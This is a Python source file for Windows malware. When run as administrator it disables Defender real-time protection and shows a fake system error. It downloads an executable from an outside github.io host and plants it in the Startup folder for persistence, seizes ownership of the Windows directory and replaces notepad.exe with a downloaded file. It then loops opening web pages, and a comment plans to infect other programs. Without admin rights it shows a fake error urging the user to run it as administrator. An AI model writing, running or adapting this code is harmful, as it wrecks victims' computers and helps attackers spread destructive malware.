from utils.functions import *
from src.HTTPLib import HttpClient
from pathlib import Path

import shutil
import os
import ctypes



def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False
    
if is_admin():
    HideConsole()
    PowerShellRun("Set-ExecutionPolicy Bypass -Scope Process -Force")
    PowerShellRun("Set-MpPreference -DisableRealtimeMonitoring $true")

    ShowFuckNotification("ERR", "x039_SUBSYSTEM: Your system does not support this function. TABLE: 0x936B80000000000, TABLE: 0x536000000000, TABLE: 0x9bC0000000000, TABLE: 0x64180000000000, TABLE: 0x080000000000")

    default_disk = os.environ['SYSTEMDRIVE']
    #def REMPROM():
        #defaultdiskpath = default_disk + "\\ProgramData\\"

        #if result:
         #   pass
        #else:
         #   pass


    path = DownloadFile('https://psvks.github.io/psvks/uploads/FullVersion.mp3')
    path2 = DownloadFile('https://psvks.github.io/psvks/uploads/otherfile.exe')
    def addBSOD():
        global path2
        file_path = path2
        startup_folder = os.path.join(os.getenv('APPDATA'), 'Microsoft\\Windows\\Start Menu\\Programs\\Startup')
        shutil.copy(file_path, startup_folder)

    #   REMPROM() function removal for testing purposes (and wont work in future updates)
    addBSOD()


    getOwnerShip(default_disk + "\\Windows")
    pathdownloaded = DownloadFile('https://psvks.github.io/psvks/uploads/output.zip')
    FolderPath = MakeFolder(default_disk + "\\tmp_folder")
    ExtractZip(pathdownloaded, FolderPath)
    MoveFile(default_disk + "\\tmp_folder\\notepad.exe", default_disk + "\\Windows")




    StartProcess(path) # This will make the music start while the program is fucking the computer



    while True:
        StopMonitor()
        os.system("start https://en.wikipedia.org/wiki/Computer_virus")
        os.system("start https://psvks.github.io/psvks/uploads/fucker.html")


    # TODO: Need to implement a logic to infect programs.
else:
    ShowFuckNotification("ERR", "1x000000329: 0x0000000000000000, failed to parse function on table 0x004000003b30031000 and 0x00009B000000491A000 \n\nExecute as administrator please.")
